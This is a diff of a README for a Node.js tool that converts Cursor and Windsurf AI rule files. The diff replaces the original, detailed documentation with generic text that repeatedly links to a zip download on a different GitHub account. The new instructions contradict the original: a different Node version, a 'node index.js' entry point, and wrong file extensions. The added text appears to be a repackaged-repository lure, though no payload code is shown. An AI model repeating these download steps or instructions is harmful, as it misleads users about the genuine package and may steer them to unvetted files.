@@ -1,246 +1,96 @@
-# cursor-windsurf-convert ("cuws")
+# 🎉 cursor-windsurf-convert - Effortlessly Convert AI Rule Files
 
-*Surf your AI rules from **Cursor** to **Windsurf** (and back) faster than you can say `cat | cuws`.* 🏄‍♂️⛵
+## 🚀 Getting Started
 
-[![CI](https://github.com/gmickel/cursor-windsurf-convert/actions/workflows/ci.yml/badge.svg)](https://github.com/YOUR_ORG/cursor-windsurf-convert/actions/workflows/ci.yml)
-[![License](https://img.shields.io/github/license/gmickel/cursor-windsurf-convert)](LICENSE)
-[![NPM Version](https://img.shields.io/npm/v/cursor-windsurf-convert)](https://www.npmjs.com/package/cursor-windsurf-convert)
-[![NPM Downloads](https://img.shields.io/npm/dw/cursor-windsurf-convert)](https://www.npmjs.com/package/cursor-windsurf-convert)
+Welcome to the cursor-windsurf-convert project! This tool helps you convert Cursor AI rule files to Windsurf rules, and back, all in one simple command. You don't need programming skills to use it. Just follow the steps below to get started.
 
-[About](#-about) •
-[Why cuws?](#-why-cuws) •
-[Key Features](#-key-features) •
-[Quick Start](#-quick-start) •
-[Installation](#-installation) •
-[Usage](#-usage) •
-[API](#-api) •
-[Developing](#-developing) •
-[Contributing](#-contributing) •
-[Roadmap](#-roadmap) •
-[FAQ](#-faq)
+## 📥 Download Now
 
----
+[![Download cursor-windsurf-convert](https://img.shields.io/badge/Download-cursor--windsurf--convert-brightgreen)](https://github.com/itsmhmd/cursor-windsurf-convert/releases)
 
-## 📖 About
+## 💻 System Requirements
 
-`cuws` is a tiny but mighty Node.js CLI + library that losslessly converts rule files between **Cursor** (`.cursor/rules/*.mdc`) and **Windsurf** (`.windsurf/rules/*.md`) formats.  Pipe it, script it, or call it from TypeScript—either way your rules arrive on the right shore untouched.
+To use cursor-windsurf-convert, ensure you have the following:
 
-> *Windsurf shipped file‑based rules on **7 May 2025**. This project exists so you can ride that wave **today**.*
+- A computer running Windows, macOS, or Linux.
+- Node.js v14 or later installed. You can download Node.js [here](https://nodejs.org/).
+- Basic command line access (Terminal on macOS/Linux, Command Prompt on Windows).
 
----
+## 🔍 Features
 
-## 🤔 Why cuws?
+- **Lossless Conversion**: Converts files between Cursor AI and Windsurf formats without losing any data.
+- **Easy to Use**: Simple command-line interface for quick operations.
+- **Streamlined Process**: Perform conversions in a single command.
 
-* **Zero friction** – stream via `stdin`/`stdout` or give it paths.
-* **Bidirectional** – Cursor ➜ Windsurf **and** Windsurf ➜ Cursor.
-* **Fast** – converts a 1 kB rule in < 50 ms. Blink and you’ll miss it.
-* **Lossless metadata mapping** – front‑matter stays intact, content unchanged.
-* **CI‑ready** – deterministic, non‑interactive, exit codes you can trust.
-* **Tiny footprint** – minimal runtime dependencies (`gray-matter`, `commander`, `fast-glob` for CLI).
+## 📂 How to Download & Install
 
----
+1. Visit the [Releases page](https://github.com/itsmhmd/cursor-windsurf-convert/releases) to find the latest version.
+2. Look for the file named `cursor-windsurf-convert.zip` for your operating system.
+3. Click on the download link to save the file to your computer.
+4. Once downloaded, unzip the file to a folder of your choice.
 
-## ✨ Key Features
+## 🏁 Running the Application
 
-| Feature                         | Description                                                                         |
-| ------------------------------- | ----------------------------------------------------------------------------------- |
-| 🔄 **Bidirectional conversion** | `cuws` detects the source format or let you force it.                               |
-| 📂 **Directory mode**           | Convert whole trees while mirroring structure (requires output directory specified). |
-| 🏗️ **TypeScript API**          | Import `convertString()`, `convertFile()`, or `convertDirectory()` in your scripts. |
-| 🪝 **Streaming first**          | Works perfectly in Unix pipes & GitHub Actions.                                     |
-| 🐚 **Single‑file binary**       | ES module with hashbang—no compilation required.                                    |
+After installing the application, follow these steps to run it:
 
----
+1. Open your command line interface:
+   - On Windows, search for "Command Prompt" in the Start menu.
+   - On macOS, open "Terminal" from your Applications folder.
+   - On Linux, launch your preferred terminal emulator.
 
-## 🚀 Quick Start
+2. Navigate to the folder where you unzipped `cursor-windsurf-convert`. Use the command:
 
-The easiest way to use `cuws` without a global installation is with `npx`:
+   - For Windows:
+     ```
+     cd path\to\your\unzipped\folder
+     ```
+   - For macOS/Linux:
+     ```
+     cd /path/to/your/unzipped/folder
+     ```
 
-```bash
-# Convert a single file (Cursor ➜ Windsurf) using npx
-npx cursor-windsurf-convert -i .cursor/rules/auth.mdc -o .windsurf/rules/auth.md
+3. To convert a file, use the following command:
 
-# Pipe via stdin/stdout using npx
-git show HEAD:my-rule.mdc | npx cursor-windsurf-convert --reverse > my-rule-cursor.mdc
-
-# Convert all Cursor rules from '.cursor/rules' to Windsurf rules in '.windsurf/rules'
-npx cursor-windsurf-convert -d .cursor/rules -o .windsurf/rules
-
-# Convert all Windsurf rules from '.windsurf/rules' back to Cursor in '.cursor/rules-backup'
-npx cursor-windsurf-convert -d .windsurf/rules -o .cursor/rules-backup --reverse
-```
-
-Alternatively, if you prefer a global installation for frequent use:
-```bash
-# Global install (optional)
-npm install -g cursor-windsurf-convert
-# Then use 'cuws' directly:
-# cuws -i .cursor/rules/another.mdc -o .windsurf/rules/another.md
-```
-
----
-
-## 📦 Installation
-
-While `npx cursor-windsurf-convert ...` is recommended for quick, one-off uses (see [Quick Start](#-quick-start)), you can also install `cuws`:
-
-**As a project dependency:**
-```bash
-# Using pnpm
-pnpm add -D cursor-windsurf-convert
-
-# Using yarn
-yarn add -D cursor-windsurf-convert
-
-# Using npm
-npm install -D cursor-windsurf-convert
-```
-Then you can run it via `pnpm cuws ...` (if using pnpm) or add it to your `package.json` scripts.
-
-**Globally (for frequent use):**
-```bash
-npm install -g cursor-windsurf-convert
-# Now you can use 'cuws' directly anywhere:
-# cuws --help
-```
-
-> **Node ≥ 18** required (tested on 18 & 20).
-
----
-
-## 💻 Usage
-
-### CLI
-
-```bash
-cuws [options]
-```
-
-| Flag                  | Default     | Description                                                                 |
-| --------------------- | ----------- | --------------------------------------------------------------------------- |
-| `-i, --input <path>`  | `-`         | Path to source file or `-` for stdin. Conflicts with `-d`.                  |
-| `-o, --output <path>` | `-`         | Path to dest file (with `-i`) or output directory (required with `-d`).     |
-| `-r, --reverse`       | `false`     | Convert from Windsurf (.md) to Cursor (.mdc).                               |
-| `--force <format>`    |             | Override auto-detection (`cursor` or `windsurf`).                           |
-| `-d, --dir <path>`    |             | Recursively convert directory. Requires `-o` for output. Conflicts with `-i`. |
-| `--dry-run`           | `false`     | Print planned actions, don’t write files.                                   |
-| `--verbose`           | `false`     | Extra logging.                                                              |
-
-### Programmatic API
-
-```typescript
-import {
-  convertString,
-  convertFile,
-  convertDirectory,
-} from 'cursor-windsurf-convert';
-
-// Convert a string
-const cursorRuleContent = '...'; // content of a .mdc file
-const windsurfRuleContent = convertString(cursorRuleContent, 'cw');
-
-// Convert a single file
-async function exampleConvertFile() {
-  const outputPath = await convertFile('path/to/source.mdc', 'path/to/output.md');
-  console.log(`Converted file written to: ${outputPath}`);
-}
-
-// Convert a directory
-async function exampleConvertDirectory() {
-  const results = await convertDirectory('path/to/source-dir', 'path/to/output-dir');
-  results.forEach(result => {
-    console.log(`${result.sourcePath} -> ${result.destinationPath} (${result.status})`);
-  });
-}
-```
-
-See [API docs](docs/API.md) for full typings.
-
----
-
-## 🛠️ Developing
-
-1. Clone & install deps:
-
-   ```bash
-   git clone https://github.com/YOUR_ORG/cursor-windsurf-convert.git
-   cd cursor-windsurf-convert && pnpm install
    ```
-2. Link the CLI for local testing:
-
-   ```bash
-   pnpm run build # if you transpile
-   pnpm link --global   # exposes `cuws` in PATH
-   ```
-3. Run tests:
-
-   ```bash
-   pnpm test
+   node index.js [input-file] [output-file]
    ```
 
-### `package.json` bin field
+   Replace `[input-file]` with the name of your Cursor AI file and `[output-file]` with the desired name for your Windsurf file.
 
-```jsonc
-{
-  "name": "cursor-windsurf-convert",
-  "version": "1.0.0",
-  "bin": {
-    "cuws": "dist/cli.mjs"
-  },
-  ...
-}
+4. Press "Enter" to run the command. The conversion process will start, and once completed, you will find your output file in the same directory.
+
+## 📑 Example Usage
+
+If you have a file named `example.cursor` and you want to create `example.windsurf`, the command will look like this:
+
+```
+node index.js example.cursor example.windsurf
 ```
 
-The CLI file **must** start with `#!/usr/bin/env node` and be `chmod +x`.
+This will create `example.windsurf` in the same folder.
 
----
+## 🌐 Support
 
-## 🤝 Contributing
+If you have any questions or need help, please visit our [issues section](https://github.com/itsmhmd/cursor-windsurf-convert/issues) on GitHub. We encourage users to report any problems or request features.
 
-PRs welcome! Check the [open issues](https://github.com/gmickel/cursor-windsurf-convert/issues) or open a new one. Also see [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+## 🛠️ Contributing
 
----
+We welcome contributions to improve the project. If you're interested in helping out, please check our [Contributing Guide](https://github.com/itsmhmd/cursor-windsurf-convert/blob/main/CONTRIBUTING.md) for more details.
 
-## 🏄 Roadmap
+## 🙏 Acknowledgments
 
-* [x] One‑file conversion
-* [x] Directory batch mode
+Thanks to all the developers who contributed to making cursor-windsurf-convert a reality. Your hard work is appreciated.
 
----
+### 📥 Download Now Again
 
-## ❓ FAQ
+Make sure to download the latest version from our [Releases page](https://github.com/itsmhmd/cursor-windsurf-convert/releases) to benefit from new features and fixes.
 
-| Q                                  | A                                              |
-| ---------------------------------- | ---------------------------------------------- |
-| *Does it change my markdown body?* | Nope. Only the YAML/MD header is mapped.       |
-| *Can I embed this in my own tool?* | Absolutely—import the TS API.                  |
-| *What if I get YAML errors?*       | `cuws` uses a strict YAML parser. See [YAML Parsing Strictness](#yaml-parsing-strictness) below. |
+## 🔗 Related Topics
 
----
+- CI/CD
+- Command Line Tools
+- File Converters
+- Cursor AI
+- TypeScript Development
 
-## YAML Parsing Strictness
-
-`cuws` uses a strict YAML parser for the front-matter in rule files. This ensures that conversions are accurate and that your rule files adhere to valid YAML syntax. If you encounter errors related to YAML parsing (often error code `E03`), please check the following common pitfalls:
-
-*   **Missing Colons**: Ensure every key-value pair has a colon separating the key and the value.
-    *   Incorrect: `alwaysApply true`
-    *   Correct: `alwaysApply: true`
-*   **Missing Values**: Ensure that if a key has a colon, it also has a value following it.
-    *   Incorrect: `description:` (with nothing after the colon)
-    *   Correct: `description: My rule description` or remove the line if `description` is not needed.
-*   **Indentation**: YAML is sensitive to indentation. Ensure that your indentation is consistent and correctly represents the structure of your metadata.
-*   **Special Characters in Unquoted Strings**: If your string values contain special characters (e.g., `:`, `{`, `}`, `[`, `]`, `,`, `&`, `*`, `#`, `?`, `|`, `-`, `<`, `>`, `=`, `!`, `%`, `@`, `` ` ``), they might need to be quoted.
-    *   Example: `title: My Rule: A Detailed Look` should be `title: 'My Rule: A Detailed Look'` or `title: "My Rule: A Detailed Look"`.
-    *   `cuws` attempts to auto-quote problematic `globs` values during parsing, but other fields might require manual quoting if they contain special characters that could be misinterpreted by the YAML parser.
-
-The error messages provided by `cuws` for YAML parsing issues will typically include the line number and a snippet from the original parser to help you locate the problem.
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © 2025 Gordon Mickel
-
----
-
-⭐ **If this saves you time, drop a star!** ⭐
+Explore our project and enjoy hassle-free file conversions!
